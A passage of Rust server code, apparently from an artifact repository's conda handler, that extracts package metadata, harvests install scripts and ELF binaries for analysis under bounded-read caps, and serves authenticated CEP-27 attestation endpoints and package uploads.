        .and_then(|buf| serde_json::from_slice::<serde_json::Value>(&buf).ok())
        .filter(|val| val.get("depends").is_some());

    // The info member, through the reference reader. `stream_conda_info`
    // seeks the archive to the `info-*.tar.zst` member and hands back a tar
    // archive over its zstd decoder; `into_inner` recovers that (unread)
    // stream so the bounded walk below applies its own budget wrapper,
    // exactly as it does for the v1 bzip2 stream. A missing or unreadable
    // info member degrades to an empty tree — the upload keeps the
    // filename-derived coordinates, as before.
    let tree =
        match rattler_package_streaming::seek::stream_conda_info(std::io::Cursor::new(content)) {
            Ok(info_archive) => collect_conda_info_tree(info_archive.into_inner()),
            Err(e) => {
                tracing::debug!("conda v2 info member is not readable: {}", e);
                CondaInfoTree::default()
            }
        };

    let mut base = root_index.or_else(|| {
        tree.index_json
            .as_ref()
            .and_then(|bytes| serde_json::from_slice::<serde_json::Value>(bytes).ok())
    })?;
    enrich_with_info_tree(&mut base, &tree);
    Some(base)
}

/// Extract metadata from .tar.bz2 (v1) conda package.
///
/// The package is a bzip2-compressed tar containing the `info/` tree. A single
/// bounded walk reads `info/index.json` plus every optional member (#4037);
/// the walk carries the same three caps as `bounded_archive`'s single-entry
/// readers — a total decompressed-byte budget, an entry-count cap, and a
/// per-entry cap — so the #2556 hardening still holds.
fn extract_conda_v1_metadata(content: &[u8]) -> Option<serde_json::Value> {
    // `MultiBzDecoder`: pbzip2/lbzip2 v1 packages are multi-stream (#4067).
    let tree = collect_conda_info_tree(bzip2::read::MultiBzDecoder::new(content));
    let mut base: serde_json::Value = serde_json::from_slice(tree.index_json.as_ref()?).ok()?;
    enrich_with_info_tree(&mut base, &tree);
    Some(base)
}

// ---------------------------------------------------------------------------
// Install scripts in the payload (#4033)
// ---------------------------------------------------------------------------
//
// conda executes `bin/.<pkg>-post-link.sh`, `bin/.<pkg>-pre-unlink.sh` and
// their Windows `Scripts/.<pkg>-post-link.bat` equivalents at link time, as
// the installing user. None of them live under `info/`: they are ordinary
// packaged files in the payload — the `pkg-*.tar.zst` member of a `.conda`,
// and the same tar as `info/` in a `.tar.bz2`. The `info/` walk above never
// opened the payload, so the install-script analysis was wired to an empty
// list. This is the extraction side that feeds it.

/// Install-script bytes harvested from a package, plus what the scan could not
/// see. The gaps travel with the bytes on purpose: an empty `scripts` means
/// "this package ships no hooks" only when `unreadable` is empty and the walk
/// ran to the end.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
struct CondaScriptHarvest {
    /// `(path, bytes)` for every entry [`conda_scripts::classify_script_path`]
    /// recognises. Not pre-filtered further: the classifier owns that decision,
    /// and `package_analysis_service` dedupes the recipe's archived copy of a
    /// script against the payload copy by body digest.
    scripts: Vec<(String, Vec<u8>)>,
    /// `(path, bytes)` for payload entries the binary cataloger
    /// ([`crate::services::binary_catalog`], #4046) may read: shared libraries
    /// and candidate executables, kept only when the bytes carry the ELF
    /// magic. Read through [`MAX_CONDA_BINARY_ENTRY_BYTES`]; an entry larger
    /// than that contributes its head, which still holds the `.rodata`
    /// banners the cataloger matches on.
    binaries: Vec<(String, Vec<u8>)>,
    /// Paths that matched but could not be read — over the per-entry cap, or a
    /// read error part-way through.
    unreadable: Vec<String>,
    /// The walk stopped before the end of an archive, so a script past that
    /// point would never have been seen.
    truncated: bool,
}

impl CondaScriptHarvest {
    /// Fold another archive member's harvest into this one. A `.conda` has two
    /// members worth scanning, and a gap in either is a gap in the package.
    fn absorb(&mut self, other: CondaScriptHarvest) {
        self.scripts.extend(other.scripts);
        self.binaries.extend(other.binaries);
        self.unreadable.extend(other.unreadable);
        self.truncated |= other.truncated;
    }

    /// One clause naming what the script scan could not see, or `None` when it
    /// saw the whole package.
    fn gap_reason(&self) -> Option<String> {
        let mut parts = Vec::new();
        if !self.unreadable.is_empty() {
            parts.push(format!(
                "some install scripts exceeded their read limit and were skipped: {}",
                self.unreadable.join(", ")
            ));
        }
        if self.truncated {
            parts.push(
                "the package archive hit an ingest read limit before the scan reached its end"
                    .to_string(),
            );
        }
        (!parts.is_empty()).then(|| parts.join("; "))
    }
}

/// Collect every install script in one decoded tar.
///
/// Shares [`walk_bounded_tar`] with the `info/` walk, so the entry-count cap
/// and the total decompressed-byte budget are literally the same; each script
/// is then read through [`MAX_CONDA_SCRIPT_ENTRY_BYTES`]. Only regular files
/// are read: a payload is full of symlinks and hardlinks, whose tar entries
/// carry no body, and recording an empty script for one would be a lie.
fn collect_conda_scripts_from_tar<R: std::io::Read>(reader: R, what: &str) -> CondaScriptHarvest {
    let mut harvest = CondaScriptHarvest::default();

    let outcome = walk_bounded_tar(reader, what, |path, entry_type, entry| {
        if !entry_type.is_file() {
            return;
        }
        if crate::services::conda_scripts::classify_script_path(path).is_some() {
            match crate::util::bounded_archive::read_capped(
                entry,
                MAX_CONDA_SCRIPT_ENTRY_BYTES,
                path,
            ) {
                Ok(bytes) => harvest.scripts.push((path.to_string(), bytes)),
                Err(e) => {
                    tracing::debug!("conda install script {} is not readable: {}", path, e);
                    harvest.unreadable.push(path.to_string());
                }
            }
            return;
        }
        // Binary cataloging (#4046): same walk, same three caps. Candidate
        // entries are read through the binary per-entry cap — keeping the
        // head of an over-cap file, whose banners still match — and buffered
        // only when the bytes prove to be ELF. Cataloging is heuristic, so a
        // binary that cannot be read is skipped WITHOUT touching
        // `unreadable`: `Completeness` describes the metadata/script read,
        // and a skipped catalog candidate must not downgrade a package whose
        // declared facts were all read.
        if !crate::services::binary_catalog::is_candidate_path(path) {
            return;
        }
        let mut buf = Vec::new();
        if std::io::Read::read_to_end(
            &mut std::io::Read::take(entry, MAX_CONDA_BINARY_ENTRY_BYTES),
            &mut buf,
        )
        .is_ok()
            && buf.starts_with(b"\x7fELF")
        {
            harvest.binaries.push((path.to_string(), buf));
        }
    });

    harvest.truncated |= outcome.truncated;
    harvest
}

/// The `.conda` (v2) ZIP members worth scanning for scripts: `pkg-*.tar.zst`
/// holds the installed files where the hooks actually run from, `info-*.tar.zst`
/// holds the recipe's archived copy of the same script.
fn is_conda_v2_scannable_member(name: &str) -> bool {
    (name.starts_with("pkg-") || name.starts_with("info-")) && name.ends_with(".tar.zst")
}

/// Harvest install scripts from a `.conda` (v2) package.
///
/// The payload member is **streamed** through zstd into the bounded tar walk
/// rather than buffered first, which is the only way it can be read at all: the
/// metadata path buffers `info-*.tar.zst` under the 8 MiB per-entry cap, and a
/// real package's payload is far larger than that. Streaming keeps the same
/// three caps — the decompressed-byte budget on the decoded stream, the
/// entry-count cap on the walk, the per-entry cap on each script — without
/// lifting any of them; a payload that inflates past the budget simply ends the
/// walk and is reported as truncated.
fn collect_conda_v2_scripts(content: &[u8]) -> CondaScriptHarvest {
    let mut harvest = CondaScriptHarvest::default();
    let Ok(mut archive) = zip::ZipArchive::new(std::io::Cursor::new(content)) else {
        tracing::debug!("conda v2 package is not a readable zip; no scripts collected");
        return harvest;
    };

    let members: Vec<usize> = (0..archive.len())
        .filter(|idx| {
            archive
                .by_index(*idx)
                .is_ok_and(|f| is_conda_v2_scannable_member(f.name()))
        })
        .collect();

    for idx in members {
        let Ok(file) = archive.by_index(idx) else {
            continue;
        };
        let what = format!("conda member {}", file.name());
        match zstd::Decoder::new(file) {
            Ok(decoder) => harvest.absorb(collect_conda_scripts_from_tar(decoder, &what)),
            Err(e) => {
                tracing::debug!("{} is not zstd-decodable: {}", what, e);
                harvest.truncated = true;
            }
        }
    }

    harvest
}

/// Harvest install scripts from a `.tar.bz2` (v1) package, whose payload and
/// `info/` tree share one tar.
fn collect_conda_v1_scripts(content: &[u8]) -> CondaScriptHarvest {
    // `MultiBzDecoder`: pbzip2/lbzip2 v1 packages are multi-stream (#4067).
    collect_conda_scripts_from_tar(bzip2::read::MultiBzDecoder::new(content), "conda v1 tar")
}

/// Harvest the install scripts of an uploaded conda package.
///
/// Best-effort throughout, like the metadata enrichment: an unreadable
/// container yields an empty harvest rather than failing an upload whose
/// artifact row is already committed.
fn collect_conda_install_scripts(content: &[u8], filename: &str) -> CondaScriptHarvest {
    if filename.ends_with(".conda") {
        collect_conda_v2_scripts(content)
    } else if filename.ends_with(".tar.bz2") {
        collect_conda_v1_scripts(content)
    } else {
        CondaScriptHarvest::default()
    }
}

// ---------------------------------------------------------------------------
// CEP-27 Attestation endpoints
// ---------------------------------------------------------------------------

/// Maximum body size for attestation uploads (1 MB). Attestations are small
/// JSON documents; anything larger is suspicious.
const ATTESTATION_MAX_BODY_SIZE: usize = 1024 * 1024;

/// Core logic for storing a CEP-27 attestation, shared by both main and
/// token-authenticated handlers.
async fn store_attestation(
    state: &SharedState,
    repo: &RepoInfo,
    repo_key: &str,
    subdir: &str,
    filename: &str,
    body: &Bytes,
) -> Result<Response, Response> {
    // Enforce attestation-specific body size limit (H3)
    if body.len() > ATTESTATION_MAX_BODY_SIZE {
        return Err((
            StatusCode::PAYLOAD_TOO_LARGE,
            "Attestation body exceeds 1 MB limit",
        )
            .into_response());
    }

    // Look up the target package
    let artifact_path = build_conda_artifact_path(subdir, filename);
    let artifact: (uuid::Uuid, String) = sqlx::query_as(
        "SELECT id, checksum_sha256 FROM artifacts WHERE repository_id = $1 AND path = $2 AND is_deleted = false LIMIT 1",
    )
    .bind(repo.id)
    .bind(&artifact_path)
    .fetch_optional(&state.db)
    .await
    .map_err(|e| {
        tracing::error!("Database error looking up artifact for attestation: {}", e);
        (StatusCode::INTERNAL_SERVER_ERROR, "Internal server error").into_response()
    })?
    .ok_or_else(|| (StatusCode::NOT_FOUND, "Package not found").into_response())?;

    let (artifact_id, package_sha256) = artifact;

    // Parse and validate the attestation
    let attestation: serde_json::Value = serde_json::from_slice(body)
        .map_err(|_| (StatusCode::BAD_REQUEST, "Invalid JSON body").into_response())?;

    validate_cep27_attestation(&attestation, filename, &package_sha256).map_err(|e| {
        (
            StatusCode::BAD_REQUEST,
            format!("CEP-27 attestation validation failed: {}", e),
        )
            .into_response()
    })?;

    // Store the attestation in artifact metadata
    sqlx::query(
        r#"
        INSERT INTO artifact_metadata (artifact_id, metadata)
        VALUES ($1, jsonb_build_object('attestation', $2::jsonb))
        ON CONFLICT (artifact_id) DO UPDATE
        SET metadata = artifact_metadata.metadata || jsonb_build_object('attestation', $2::jsonb)
        "#,
    )
    .bind(artifact_id)
    .bind(&attestation)
    .execute(&state.db)
    .await
    .map_err(|e| {
        tracing::error!("Failed to store attestation: {}", e);
        (StatusCode::INTERNAL_SERVER_ERROR, "Internal server error").into_response()
    })?;

    info!(
        repo = %repo_key,
        package = %filename,
        "CEP-27 attestation stored"
    );

    Ok(Response::builder()
        .status(StatusCode::CREATED)
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::json!({"status": "attestation stored"}).to_string(),
        ))
        .unwrap())
}

/// Core logic for retrieving a CEP-27 attestation.
async fn fetch_attestation(
    state: &SharedState,
    repo: &RepoInfo,
    subdir: &str,
    filename: &str,
) -> Result<Response, Response> {
    let artifact_path = build_conda_artifact_path(subdir, filename);
    let row: Option<(serde_json::Value,)> = sqlx::query_as(
        r#"
        SELECT am.metadata
        FROM artifacts a
        JOIN artifact_metadata am ON am.artifact_id = a.id
        WHERE a.repository_id = $1 AND a.path = $2 AND a.is_deleted = false
        LIMIT 1
        "#,
    )
    .bind(repo.id)
    .bind(&artifact_path)
    .fetch_optional(&state.db)
    .await
    .map_err(|e| {
        tracing::error!("Database error fetching attestation: {}", e);
        (StatusCode::INTERNAL_SERVER_ERROR, "Internal server error").into_response()
    })?;

    let metadata =
        row.ok_or_else(|| (StatusCode::NOT_FOUND, "Package not found").into_response())?;

    let attestation = metadata.0.get("attestation").ok_or_else(|| {
        (
            StatusCode::NOT_FOUND,
            "No attestation found for this package",
        )
            .into_response()
    })?;

    let body = serde_json::to_string_pretty(attestation).map_err(|_| {
        (StatusCode::INTERNAL_SERVER_ERROR, "Internal server error").into_response()
    })?;
    Ok(Response::builder()
        .status(StatusCode::OK)
        .header(CONTENT_TYPE, "application/json")
        .header(CONTENT_LENGTH, body.len().to_string())
        .body(Body::from(body))
        .unwrap())
}

/// PUT /conda/{repo_key}/{subdir}/{filename}/attestation
async fn put_attestation(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    Path((repo_key, subdir, filename)): Path<(String, String, String)>,
    body: Bytes,
) -> Result<Response, Response> {
    // GHSA-vvc3-h39c-mrq5: enforce token scope before processing.
    let _user_id = require_auth_basic_scope(auth, "conda", "write:artifacts")?.user_id;
    let repo = resolve_conda_repo(&state.db, &repo_key).await?;
    store_attestation(&state, &repo, &repo_key, &subdir, &filename, &body).await
}

/// GET /conda/{repo_key}/{subdir}/{filename}/attestation
///
/// Requires authentication to match the repository's read-auth posture.
async fn get_attestation(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    Path((repo_key, subdir, filename)): Path<(String, String, String)>,
) -> Result<Response, Response> {
    // Attestations follow the repo's auth requirements. If the repo is
    // public the authenticate call will succeed with anonymous access
    // via the optional auth middleware on the outer router.
    let _user_id = require_auth_basic(auth, "conda")?.user_id;
    let repo = resolve_conda_repo(&state.db, &repo_key).await?;
    fetch_attestation(&state, &repo, &subdir, &filename).await
}

/// PUT /conda/t/{token}/{repo_key}/{subdir}/{filename}/attestation
async fn put_attestation_with_token(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    Path((token, repo_key, subdir, filename)): Path<(String, String, String, String)>,
    body: Bytes,
) -> Result<Response, Response> {
    // GHSA-vvc3-h39c-mrq5: enforce token scope before processing.
    let _user_id = if auth.is_some() {
        require_auth_basic_scope(auth, "conda", "write:artifacts")?.user_id
    } else {
        authenticate_with_token(&state.db, &state.config, &token).await?
    };
    let repo = resolve_conda_repo(&state.db, &repo_key).await?;
    store_attestation(&state, &repo, &repo_key, &subdir, &filename, &body).await
}

/// GET /conda/t/{token}/{repo_key}/{subdir}/{filename}/attestation
async fn get_attestation_with_token(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    Path((token, repo_key, subdir, filename)): Path<(String, String, String, String)>,
) -> Result<Response, Response> {
    let _user_id = if auth.is_some() {
        require_auth_basic(auth, "conda")?.user_id
    } else {
        authenticate_with_token(&state.db, &state.config, &token).await?
    };
    let repo = resolve_conda_repo(&state.db, &repo_key).await?;
    fetch_attestation(&state, &repo, &subdir, &filename).await
}

// ---------------------------------------------------------------------------
// Shared upload logic
// ---------------------------------------------------------------------------

/// The recipe files the analyzer parses, read back out of the extracted
/// metadata document where `enrich_with_info_tree` stored them as raw text.
fn conda_recipe_files(doc: &serde_json::Value) -> Vec<(String, Vec<u8>)> {
    doc.get("recipe")
        .and_then(|r| r.as_object())
        .map(|m| {
            m.iter()
                .filter_map(|(name, v)| v.as_str().map(|s| (name.clone(), s.as_bytes().to_vec())))
                .collect()
        })
        .unwrap_or_default()
}

/// The `info/` members that were there but could not be used.
///
/// `info_files` records, per member, whether it was present, absent or
/// unreadable. Anything unreadable means the package was only partially
/// inspected, and the UI must say so rather than render a green "nothing
/// found".
fn conda_unreadable_info_slots(doc: &serde_json::Value) -> Vec<String> {
    doc.get("info_files")
        .and_then(|s| s.as_object())
        .map(|m| {
            m.iter()
                .filter(|(_, v)| v.as_str() == Some(INFO_STATUS_UNREADABLE))
                .map(|(k, _)| k.clone())
                .collect()
        })
        .unwrap_or_default()
}

/// How much of a conda package the upload path actually managed to read.
///
/// `Complete` requires both halves to be whole: every `info/` member readable
/// *and* every install script read in full by a walk that reached the end of
/// the archive. A script we could not read is the one gap that must never be
/// rounded down to "no scripts found", because that renders as a clean bill of
/// health for a package whose install-time code was never looked at.
fn conda_analysis_completeness(
    extracted: Option<&serde_json::Value>,
    scripts: &CondaScriptHarvest,
) -> crate::services::package_analysis_service::Completeness {
    use crate::services::package_analysis_service::Completeness;

    let Some(doc) = extracted else {
        return Completeness::NotRead {
            reason: "Package contents could not be decoded at upload time".to_string(),
        };
    };

    let mut gaps: Vec<String> = Vec::new();
    let unreadable = conda_unreadable_info_slots(doc);
    if !unreadable.is_empty() {
        gaps.push(format!(
            "some package metadata exceeded its read limit and was skipped: {}",
            unreadable.join(", ")
        ));
    }
    gaps.extend(scripts.gap_reason());

    if gaps.is_empty() {
        return Completeness::Complete;
    }

    let mut reason = gaps.join("; ");
    if let Some(first) = reason.get_mut(0..1) {
        first.make_ascii_uppercase();
    }
    Completeness::Partial {
        reason,
        files_read: scripts.scripts.len() as i32,
        files_total: (scripts.scripts.len() + scripts.unreadable.len()) as i32,
    }
}

/// Record the vendored-component and install-script analysis for a stored
/// conda package (#4033).
///
/// Best-effort, exactly like the metadata enrichment above it: the artifact row
/// is already committed, so a failure here must not fail an upload that
/// otherwise succeeded. But "best effort" must not become "silently claims
/// nothing was found" — the whole point of `Completeness` is that an empty
/// component list means something different depending on whether we looked.
/// So every path below records a row, including the ones where we could not.
///
/// `extracted` is `None` when the bounded-extraction permit was unavailable or
/// the archive could not be decoded at all; that is `NotRead`, not `Complete`.
///
/// `scripts` carries the payload's install scripts — `bin/.<pkg>-post-link.sh`
/// and friends, which live outside `info/` and so needed a walk of their own —
/// together with any that were too large to read.
async fn record_conda_package_analysis(
    state: &SharedState,
    artifact_id: uuid::Uuid,
    extracted: Option<&serde_json::Value>,
    scripts: CondaScriptHarvest,
) {
    use crate::services::package_analysis_service::{record_analysis, PackageAnalysisInput};

    let completeness = conda_analysis_completeness(extracted, &scripts);
    let recipe_files = extracted.map(conda_recipe_files).unwrap_or_default();

    // Binary cataloging (#4046): the harvested ELF payloads yield components
    // from SONAME + version-banner evidence. `record_analysis` decides
    // whether they are recorded — it suppresses `binary:` components when the
    // recipe declares sources, so the FP-prone signal is spent only on the
    // recipe-less residue it exists for.
    let components = crate::services::binary_catalog::catalog_payload(&scripts.binaries)
        .iter()
        .map(crate::services::binary_catalog::BinaryFinding::to_extracted)
        .collect();

    let input = PackageAnalysisInput {
        artifact_id,
        format: "conda".to_string(),
        recipe_files,
        script_files: scripts.scripts,
        inline_scripts: Vec::new(),
        unanalyzed_scripts: Vec::new(),
        components,
        completeness,
    };

    if let Err(e) = record_analysis(&state.db, input).await {
        tracing::warn!(
            artifact_id = %artifact_id,
            error = %e,
            "conda package analysis could not be recorded"
        );
    }
}

/// The `noarch:` declaration from the package's own `info/index.json`.
///
/// Read from the extracted document rather than from the subdir the upload
/// was addressed to: a noarch package published under `linux-64` is still one
/// artifact, and `CondaPurl::with_noarch` is what keeps it from acquiring an
/// identity per platform it was seen on.
///
/// Both spellings are accepted because both appear in the wild: the modern
/// `"python"`/`"generic"` string and the legacy boolean `true`.
fn conda_noarch_kind(extracted: Option<&serde_json::Value>) -> Option<NoarchKind> {
    let raw = extracted?.get("noarch")?;
    let text = match raw {
        serde_json::Value::String(s) => s.clone(),
        serde_json::Value::Bool(b) => b.to_string(),
        _ => return None,
    };
    NoarchKind::parse(&text)
}

/// Gather the identity coordinates of one stored conda package (#4041, #4042).
///
/// Split out of `store_conda_package` so the ingest path and its tests resolve
/// the same coordinates, rather than the tests asserting against a second
/// hand-built input that can drift from the one uploads actually use.
///
/// `channel` is the channel this artifact came from: a remote repository's
/// upstream URL where there is one (the true provenance of a proxied
/// artifact), otherwise this repository's own key, which is the channel a
/// `conda install -c ...` names. Both spellings normalize through
/// `CondaPurl::with_channel`.
fn conda_identity_input<'a>(
    pkg_name: &'a str,
    pkg_version: &'a str,
    build_string: &'a str,
    subdir: &'a str,
    filename: &str,
    channel: &'a str,
    extracted: Option<&serde_json::Value>,
) -> CondaIdentityInput<'a> {
    CondaIdentityInput {
        name: pkg_name,
        version: pkg_version,
        build: build_string,
        subdir,
        noarch: conda_noarch_kind(extracted),
        channel: Some(channel).filter(|c| !c.trim().is_empty()),
        archive_type: CondaArchiveType::from_filename(filename),
    }
}

async fn store_conda_package(
    state: &SharedState,
    repo: &RepoInfo,
    subdir: &str,
    filename: &str,
    content: Bytes,
    user_id: uuid::Uuid,
) -> Result<Response, Response> {
    // Parse the filename using the existing conda_native handler
    let conda_path = build_conda_artifact_path(subdir, filename);
    let path_info = CondaNativeHandler::parse_path(&conda_path).map_err(|e| {
        (
            StatusCode::BAD_REQUEST,
            format!("Invalid Conda package path: {}", e),
        )
            .into_response()
    })?;

    let pkg_name = path_info
        .name
        .ok_or_else(|| (StatusCode::BAD_REQUEST, "Could not parse package name").into_response())?;
    let pkg_version = path_info.version.ok_or_else(|| {
        (StatusCode::BAD_REQUEST, "Could not parse package version").into_response()
    })?;
    let build_string = path_info.build.unwrap_or_else(|| "0".to_string());

    // CEP-26: Validate naming constraints before accepting the upload
    validate_cep26_naming(&pkg_name, &pkg_version, &build_string, filename, subdir).map_err(
        |e| {
            (
                StatusCode::BAD_REQUEST,
                format!("CEP-26 naming violation: {}", e),
            )
                .into_response()
        },
    )?;

    // Validate package structure before storing.
    // #2561: permit-scoped decode, fast-fail 503 on saturation.
    crate::util::bounded_archive::with_ingest_extraction(|| {
        validate_conda_package(&content, filename)
    })
    .map_err(|e| e.into_response())?
    .map_err(|e| (StatusCode::BAD_REQUEST, e).into_response())?;

    // Compute SHA256 and MD5
    let mut sha256_hasher = Sha256::new();
    sha256_hasher.update(&content);
    let computed_sha256 = format!("{:x}", sha256_hasher.finalize());

    let computed_md5 = {
        use md5::Md5;
        let mut hasher = Md5::new();
        md5::Digest::update(&mut hasher, &content);
        format!("{:x}", md5::Digest::finalize(hasher))
    };

    let artifact_path = build_conda_artifact_path(subdir, filename);

    // Check for duplicate
    let existing = sqlx::query_scalar!(
        "SELECT id FROM artifacts WHERE repository_id = $1 AND path = $2 AND is_deleted = false",
        repo.id,
        artifact_path
    )
    .fetch_optional(&state.db)
    .await
    .map_err(|e| {
        tracing::error!("Database error checking for duplicate artifact: {}", e);
        (StatusCode::INTERNAL_SERVER_ERROR, "Internal server error").into_response()
    })?;

    if existing.is_some() {
        return Err((StatusCode::CONFLICT, "Package already exists").into_response());
    }

    super::cleanup_soft_deleted_artifact_checked(
        &state.db,
        &crate::models::repository::RepositoryFormat::Conda,
        repo.id,
        &artifact_path,
        &computed_sha256,
    )
    .await
    .map_err(|e| e.into_response())?;

    // Store the file
    let storage_key = build_conda_storage_key(&repo.id, subdir, filename);
    let storage = state
        .storage_for_repo(&repo.storage_location())
        .map_err(|e| e.into_response())?;
    storage
        .put(&storage_key, content.clone())
        .await
        .map_err(|e| {
            tracing::error!("Storage error writing conda package: {}", e);
            (StatusCode::INTERNAL_SERVER_ERROR, "Internal server error").into_response()
        })?;

    let size_bytes = content.len() as i64;
    let content_type = if filename.ends_with(".conda") {
        "application/octet-stream"
    } else {
        "application/x-tar"
    };

    // Insert artifact record
    let artifact_id = sqlx::query_scalar!(
        r#"
        INSERT INTO artifacts (
            repository_id, path, name, version, size_bytes,
            checksum_sha256, content_type, storage_key, uploaded_by
        )
        VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
        RETURNING id
        "#,
        repo.id,
        artifact_path,
        pkg_name,
        pkg_version,
        size_bytes,
        computed_sha256,
        content_type,
        storage_key,
        user_id,
    )
    .fetch_one(&state.db)
    .await
    .map_err(|e| {
        tracing::error!("Database error inserting artifact: {}", e);
        (StatusCode::INTERNAL_SERVER_ERROR, "Internal server error").into_response()
    })?;

    crate::services::quarantine_service::apply_upload_hold_hosted(&state.db, repo.id, artifact_id)
        .await;

    // Extract metadata from package contents. #2561: permit-scoped decode; the
    // artifact row is already committed, so a saturated server skips this
    // best-effort enrichment rather than failing the stored upload.
    // The install scripts come out of the payload, which the metadata walk
    // never opens, so they need a second pass over the same bytes — inside the
    // same permit, since it is the same class of bounded decode work.
    let (extracted, install_scripts) = crate::util::bounded_archive::with_ingest_extraction(|| {
        (
            extract_conda_metadata(&content, filename),
            collect_conda_install_scripts(&content, filename),
        )
    })
    .unwrap_or_default();

    // #4041/#4042: the identity the advisory path queries with. `pkg:conda/<name>`
    // on its own matches nothing — OSV and the GitHub Advisory Database have no
    // conda ecosystem — so what is recorded here is a purl that names *this*
    // build plus the PyPI aliases through which conda content inherits coverage.
    //
    // Best-effort, like the enrichment above it: `CondaIdentity::resolve` has no
    // failure mode, and a package nothing maps is recorded as unmapped rather
    // than as nothing, so the advisory path can tell "we looked and it is clean"
    // from "we never asked".
    let identity = CondaIdentity::resolve(
        conda_identity_input(
            &pkg_name,
            &pkg_version,
            &build_string,
            subdir,
            filename,
            repo.upstream_url.as_deref().unwrap_or(repo.key.as_str()),
            extracted.as_ref(),
        ),
        conda_identity::process_alias_map(),
    );
    if let Some(error) = &identity.purl_error {
        tracing::warn!(
            artifact_id = %artifact_id,
            package = %pkg_name,
            error = %error,
            "conda package stored without a purl; it will not match any advisory by identity"
        );
    }

    let conda_metadata = build_conda_metadata(
        &pkg_name,
        &pkg_version,
        &build_string,
        subdir,
        conda_package_format(filename),
        &computed_md5,
        extracted.as_ref(),
        identity.to_document(),
    );

    let _ = sqlx::query!(
        r#"
        INSERT INTO artifact_metadata (artifact_id, format, metadata)
        VALUES ($1, 'conda', $2)
        ON CONFLICT (artifact_id) DO UPDATE SET metadata = $2
        "#,
        artifact_id,
        conda_metadata,
    )
    .execute(&state.db)
    .await;

    record_conda_package_analysis(state, artifact_id, extracted.as_ref(), install_scripts).await;

    // Surface the package on the Packages page (#3659), keyed on the conda
    // package's own name/version (the build string stays in metadata), with
    // the `summary` read out of the package's `index.json` where present.
    crate::services::package_service::register_published_package(
        &state.db,
        &state.event_bus,
        repo.id,
        "conda",
        &pkg_name,
        &pkg_version,
        size_bytes,
        &computed_sha256,
        extracted
            .as_ref()
            .and_then(|m| m.get("summary"))
            .and_then(|v| v.as_str())
            .filter(|d| !d.is_empty()),
    )
    .await;

    // Update repository timestamp
    let _ = sqlx::query!(
        "UPDATE repositories SET updated_at = NOW() WHERE id = $1",
        repo.id,
    )
    .execute(&state.db)
    .await;

    info!(
        "Conda upload: {}-{}-{} ({}) to repo {}/{}",
        pkg_name, pkg_version, build_string, filename, repo.id, subdir
    );

    Ok(Response::builder()
        .status(StatusCode::CREATED)
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            build_conda_upload_response(
                &pkg_name,
                &pkg_version,
                &build_string,
                subdir,
                &computed_sha256,
                size_bytes,
            )
            .to_string(),
        ))
        .unwrap())
}

/// Build the `artifact_metadata.metadata` document persisted for a conda
/// package: the coordinates taken from the filename plus everything the
/// `info/` tree yielded (#4037).
///
/// Split out of `store_conda_package` so the keys written here can be asserted
/// against the keys `channeldata.json` and `run_exports.json` read back
/// (#4038) without standing up a database.
#[allow(clippy::too_many_arguments)]
fn build_conda_metadata(
    pkg_name: &str,
    pkg_version: &str,
    build_string: &str,
    subdir: &str,
    package_format: &str,
    computed_md5: &str,
    extracted: Option<&serde_json::Value>,
    identity: serde_json::Value,
) -> serde_json::Value {
    let field_str = |field: &str| {
        extracted
            .and_then(|m| m.get(field).and_then(|v| v.as_str()))
            .unwrap_or("")
            .to_string()
    };

    let build_number = extracted
        .and_then(|m| m.get("build_number").and_then(|v| v.as_u64()))
        .unwrap_or(0);

    let depends = extracted
        .and_then(|m| m.get("depends"))
        .cloned()
        .unwrap_or_else(|| serde_json::json!([]));

    let constrains = extracted
        .and_then(|m| m.get("constrains"))
        .cloned()
        .unwrap_or_else(|| serde_json::json!([]));

    let timestamp = extracted.and_then(|m| m.get("timestamp").and_then(|v| v.as_u64()));

    let license_family = field_str("license_family");
    let features = field_str("features");
    let track_features = field_str("track_features");
    let noarch = field_str("noarch");

    // Store conda-specific metadata (with real values extracted from package)
    let mut conda_metadata = serde_json::json!({
        "name": pkg_name,
        "version": pkg_version,
        "build": build_string,
        "build_number": build_number,
        "subdir": subdir,
        "package_format": package_format,
        "depends": depends,
        "constrains": constrains,
        "license": field_str("license"),
        "md5": computed_md5,
    });
    if !license_family.is_empty() {
        conda_metadata["license_family"] = serde_json::Value::String(license_family);
    }
    if let Some(ts) = timestamp {
        conda_metadata["timestamp"] = serde_json::json!(ts);
    }
    if !features.is_empty() {
        conda_metadata["features"] = serde_json::Value::String(features);
    }
    if !track_features.is_empty() {
        conda_metadata["track_features"] = serde_json::Value::String(track_features);
    }
    if !noarch.is_empty() {
        conda_metadata["noarch"] = serde_json::Value::String(noarch);
    }

    // #4038: the about.json text fields channeldata.json serves. Written flat
    // under the very keys the read path looks for, and only when the package
    // actually declared them.
    for key in CHANNELDATA_METADATA_KEYS {
        let already_set = conda_metadata
            .get(key)
            .and_then(|v| v.as_str())
            .is_some_and(|s| !s.is_empty());
        if already_set {
            continue;
        }
        if let Some(value) = extracted.and_then(|m| m.get(key)).and_then(|v| v.as_str()) {
            if !value.is_empty() {
                conda_metadata[key] = serde_json::Value::String(value.to_string());
            }
        }
    }

    // #4037: the structured members of the info/ tree, stored verbatim. `paths`
    // and `info_files` are always written (they record absence explicitly);
    // the rest appear only when the package carried them. `run_exports` passes
    // through `normalize_run_exports` so the legacy bare-list spelling is
    // stored in its CEP-12 dict form even if a caller skipped the
    // extraction-time normalisation (#4038).
    for key in [
        "about",
        "paths",
        "recipe",
        "link",
        RUN_EXPORTS_METADATA_KEY,
        "hash_input",
        "has_install_scripts",
        "info_files",
    ] {
        if let Some(value) = extracted.and_then(|m| m.get(key)) {
            let value = if key == RUN_EXPORTS_METADATA_KEY {
                normalize_run_exports(value.clone())
            } else {
                value.clone()
            };
            conda_metadata[key] = value;
        }
    }

    // #4041/#4042: the identity document, under the one key
    // `conda_identity::read_identity` reads it back from.
    conda_metadata[conda_identity::IDENTITY_METADATA_KEY] = identity;

    conda_metadata
}

// ---------------------------------------------------------------------------
// Utility helpers
// ---------------------------------------------------------------------------

/// Serialize to msgpack and compress with zstd.
/// Shared by shard index and individual shard handlers.
#[allow(clippy::result_large_err)]
